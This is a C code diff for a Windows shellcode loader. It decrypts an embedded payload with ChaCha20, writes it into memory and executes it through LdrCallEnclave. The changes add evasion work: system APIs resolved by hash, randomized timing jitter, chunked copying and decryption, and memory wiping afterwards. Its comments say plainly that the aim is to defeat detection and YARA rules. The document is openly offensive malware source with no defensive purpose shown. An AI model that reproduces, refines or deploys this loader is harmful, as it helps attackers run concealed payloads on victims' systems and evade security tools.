@@ -5,23 +5,33 @@
 #include "api_resolver.h"
 
 PVOID find_memory_region(size_t size) {
-    SYSTEM_INFO sysInfo;
-    GetSystemInfo(&sysInfo);
+    SYSTEM_INFO system_info;
+    GetSystemInfo(&system_info);
+
+    // system resource entropy so its harder to detect and hunt down/reverse :d
+    ULONGLONG entropy_value = (GetCurrentProcessId() * GetTickCount()) ^ (ULONGLONG)GetCurrentThreadId() ^ __rdtsc();
+    PBYTE current_address = (PBYTE)system_info.lpMinimumApplicationAddress;
+    current_address += (entropy_value * 0x1000) % 
+           (SIZE_T)(system_info.lpMaximumApplicationAddress - system_info.lpMinimumApplicationAddress);
     
-    PBYTE base = (PBYTE)sysInfo.lpMinimumApplicationAddress;
-    base += (GetCurrentProcessId() * 0x1000) % (SIZE_T)(sysInfo.lpMaximumApplicationAddress - sysInfo.lpMinimumApplicationAddress);
+    MEMORY_BASIC_INFORMATION memory_info;
+    SIZE_T query_result;
     
-    MEMORY_BASIC_INFORMATION mbi;
-    SIZE_T querySize;
-    
-    for (PBYTE addr = base; addr < sysInfo.lpMaximumApplicationAddress; addr += mbi.RegionSize) {
-        querySize = VirtualQuery(addr, &mbi, sizeof(mbi));
-        if (querySize == 0) break;
+    for (PBYTE address = current_address; address < system_info.lpMaximumApplicationAddress; address += memory_info.RegionSize) {
+        if ((ULONGLONG)address % 0x2000 == 0) {
+            precise_delay(1 + (__rdtsc() % 3), 0.1f);
+        }
         
-        if (mbi.State == MEM_COMMIT && 
-            (mbi.Protect & PAGE_EXECUTE_READ) &&
-            mbi.RegionSize >= size) {
-            return mbi.BaseAddress;
+        query_result = VirtualQuery(address, &memory_info, sizeof(memory_info));
+        if (query_result == 0) break;
+        
+        if (memory_info.State == MEM_COMMIT && 
+            (memory_info.Protect & (PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_READWRITE)) &&
+            !(memory_info.Protect & (PAGE_GUARD | PAGE_NOACCESS)) &&
+            memory_info.RegionSize >= size) {
+            if (is_region_safe(address, size)) {
+                return memory_info.BaseAddress;
+            }
         }
     }
     
@@ -29,117 +39,145 @@ PVOID find_memory_region(size_t size) {
 }
 
 HMODULE load_tprtdll() {
-    HMODULE hTprt = GetModuleHandleW(L"tprtdll.dll");
-    if (hTprt) return hTprt;
-    
-    hTprt = LoadLibraryExW(L"tprtdll.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
-    if (hTprt) return hTprt;
-    
-    wchar_t systemDir[MAX_PATH];
-    GetSystemDirectoryW(systemDir, MAX_PATH);
-    wcscat_s(systemDir, MAX_PATH, L"\\tprtdll.dll");
-    
-    hTprt = LoadLibraryExW(systemDir, NULL, DONT_RESOLVE_DLL_REFERENCES);
-    if (hTprt) return hTprt;
-    
-    hTprt = LoadLibraryW(L"tprtdll.dll");
-    
-    return hTprt;
+    // if in memory, best case for  us 
+    HMODULE module_handle = GetModuleHandleW(L"tprtdll.dll");
+    if (module_handle) return module_handle;
+
+    // stealthy from disk, second choice
+    module_handle = LoadLibraryExW(L"tprtdll.dll", NULL, DONT_RESOLVE_DLL_REFERENCES | LOAD_LIBRARY_SEARCH_SYSTEM32);
+    if (module_handle) return module_handle;
+
+    //fallback 
+    return GetModuleHandleA("ntdll.dll");
 }
 
 void execute_payload() {
     if (!is_safe_environment()) {
         return;
     }
+
+
+    //entropy based jitter  to kill yara rules 
+    ULONGLONG timer_value = __rdtsc();
+    precise_delay(200 + (timer_value % 500), 0.4f);
     
-    HMODULE hTprt = load_tprtdll();
-    if (!hTprt) {
-        hTprt = GetModuleHandleA("ntdll.dll");
-        printf("[+] Using ntdll.dll fallback: 0x%p\n", hTprt);
-    } else {
-        printf("[+] tprtdll.dll loaded: 0x%p\n", hTprt);
+    HMODULE target_module = load_tprtdll();
+    if (!target_module) {
+        target_module = GetModuleHandleA("ntdll.dll");
     }
     
-    _NtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = 
-        (_NtAllocateVirtualMemoryEx)get_function_by_hash(hTprt, compute_custom_hash("NtAllocateVirtualMemoryEx"));
-    _NtProtectVirtualMemory NtProtectVirtualMemory = 
-        (_NtProtectVirtualMemory)get_function_by_hash(hTprt, compute_custom_hash("NtProtectVirtualMemory"));
+    _NtAllocateVirtualMemoryEx allocate_memory = 
+        (_NtAllocateVirtualMemoryEx)get_function_by_hash_stealth(target_module, compute_custom_hash("NtAllocateVirtualMemoryEx"));
+    _NtProtectVirtualMemory protect_memory = 
+        (_NtProtectVirtualMemory)get_function_by_hash_stealth(target_module, compute_custom_hash("NtProtectVirtualMemory"));
     
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    _LdrCallEnclave LdrCallEnclave = 
-        (_LdrCallEnclave)get_function_by_hash(ntdll, compute_custom_hash("LdrCallEnclave"));
+    HMODULE ntdll_module = GetModuleHandleA("ntdll.dll");
+    _LdrCallEnclave call_enclave = 
+        (_LdrCallEnclave)get_function_by_hash_stealth(ntdll_module, compute_custom_hash("LdrCallEnclave"));
     
-    if (!NtAllocateVirtualMemoryEx || !NtProtectVirtualMemory || !LdrCallEnclave) {
+    if (!allocate_memory || !protect_memory || !call_enclave) {
         return;
     }
-    printf("[+] All APIs successfuly resolved\n");
-    // Use enhanced ChaCha20 encryption instead of RC4
-    BYTE derived_key[32];
-    BYTE nonce[12];
-    if (!derive_encryption_key_chacha(derived_key, sizeof(derived_key), nonce, sizeof(nonce))) {
-        // Fallback to RC4 if ChaCha20 fails
-        if (!derive_encryption_key(derived_key, sizeof(derived_key))) {
-            return;
-        }
+    
+    BYTE encryption_key[32];
+    BYTE initialization_vector[12];
+    if (!derive_encryption_key_chacha_stealth(encryption_key, sizeof(encryption_key), initialization_vector, sizeof(initialization_vector))) {
+        return;
     }
     
-    PVOID shellcode_addr = find_memory_region(encrypted_shellcode_size);
-    BOOL allocated = FALSE;
+    PVOID code_address = find_memory_region(encrypted_shellcode_size);
+    BOOL memory_allocated = FALSE;
     
-    if (!shellcode_addr) {
-        printf("[+] No suitable memory found, allocating...\n");
-        SIZE_T region_size = encrypted_shellcode_size;
-        NTSTATUS status = NtAllocateVirtualMemoryEx(
+    if (!code_address) {
+        SIZE_T allocation_size = encrypted_shellcode_size + (__rdtsc() % 0x800);
+        NTSTATUS result = allocate_memory(
             GetCurrentProcess(),
-            &shellcode_addr,
-            &region_size,
+            &code_address,
+            &allocation_size,
             MEM_RESERVE | MEM_COMMIT,
             PAGE_READWRITE,
             NULL,
             0
         );
         
-        if (status != 0) {
-            printf("[-] NtAllocateVirtualMemoryEx failed: 0x%X\n", status);
+        if (result != 0) {
             return;
         }
-        allocated = TRUE;
-        printf("[+] Memory allocated at: 0x%p\n", shellcode_addr);
+        memory_allocated = TRUE;
     }
     
-    memcpy(shellcode_addr, encrypted_shellcode, encrypted_shellcode_size);
-    printf("[+] Found existing memory region at: 0x%p\n", shellcode_addr);
-    // Use ChaCha20 if available, otherwise fallback to RC4
-    if (derive_encryption_key_chacha(derived_key, sizeof(derived_key), nonce, sizeof(nonce))) {
-        chacha20_cryptography((PBYTE)shellcode_addr, encrypted_shellcode_size, derived_key, sizeof(derived_key), nonce);
-    } else {
-        rc4_cryptography((PBYTE)shellcode_addr, encrypted_shellcode_size, derived_key, sizeof(derived_key));
+    for (size_t position = 0; position < encrypted_shellcode_size; position += 0x100) {
+        size_t block_size = min(0x100, encrypted_shellcode_size - position);
+        memcpy((PBYTE)code_address + position, (PBYTE)encrypted_shellcode + position, block_size);
+        precise_delay(1 + (__rdtsc() % 2), 0.1f);
+    }
+
+    // chacha20 custom stealth where we smash to chunks with scattered memcpy and chunking with micro delays
+    size_t chunk_size = 512 + (__rdtsc() % 512);
+    for (size_t offset = 0; offset < encrypted_shellcode_size; ) {
+        size_t current_chunk = chunk_size + (GetTickCount() % 256);
+        if (offset + current_chunk > encrypted_shellcode_size) {
+            current_chunk = encrypted_shellcode_size - offset;
+        }
+        
+        chacha20_cryptography((PBYTE)code_address + offset, current_chunk, 
+                             encryption_key, sizeof(encryption_key), initialization_vector);
+        
+        offset += current_chunk;
+        precise_delay(1 + (__rdtsc() % 4), 0.2f);
     }
     
-    if (allocated) {
-        SIZE_T region_size = encrypted_shellcode_size;
-        ULONG old_protect;
-        NTSTATUS status = NtProtectVirtualMemory(
+    if (memory_allocated) {
+        SIZE_T memory_size = encrypted_shellcode_size;
+        ULONG original_protection;
+        NTSTATUS status = protect_memory(
             GetCurrentProcess(),
-            &shellcode_addr,
-            &region_size,
-            PAGE_EXECUTE_READ,
+            &code_address,
+            &memory_size,
+            PAGE_EXECUTE_READ_WRITE,
+            &original_protection
+        );
+        
+        if (status == 0) {
+            status = protect_memory(
+                GetCurrentProcess(),
+                &code_address,
+                &memory_size,
+                PAGE_EXECUTE_READ,
+                &original_protection
+            );
+        }
+        
+        if (status != 0) {
+            SecureZeroMemory(code_address, encrypted_shellcode_size);
+            VirtualFree(code_address, 0, MEM_RELEASE);
+            return;
+        }
+    }
+    
+    FlushInstructionCache(GetCurrentProcess(), code_address, encrypted_shellcode_size);
+    
+    PVOID parameter = NULL;
+    
+    if (call_enclave) {
+        precise_delay(50 + (__rdtsc() % 100), 0.1f);
+        call_enclave((PENCLAVE_ROUTINE)code_address, 0, &parameter);
+    }
+    // more jitter >:3
+    precise_delay(100 + (GetCurrentThreadId() % 200), 0.2f);
+    
+    if (memory_allocated) {
+        SIZE_T free_size = encrypted_shellcode_size;
+        ULONG old_protect;
+        protect_memory(
+            GetCurrentProcess(),
+            &code_address,
+            &free_size,
+            PAGE_READWRITE,
             &old_protect
         );
         
-        if (status != 0) {
-            VirtualFree(shellcode_addr, 0, MEM_RELEASE);
-            return;
-        }
-        printf("[+] Memory protection changed to RX\n");
-    }
-    
-    FlushInstructionCache(GetCurrentProcess(), shellcode_addr, encrypted_shellcode_size);
-    printf("[+] Instruction cache flushed\n");
-    PVOID dummy_param = NULL;
-    LdrCallEnclave((PENCLAVE_ROUTINE)shellcode_addr, 0, &dummy_param);
-    printf("[!] Shellcode executed in memory\n");
-    if (allocated) {
-        VirtualFree(shellcode_addr, 0, MEM_RELEASE);
+        SecureZeroMemory(code_address, encrypted_shellcode_size);
+        VirtualFree(code_address, 0, MEM_RELEASE);
     }
 }
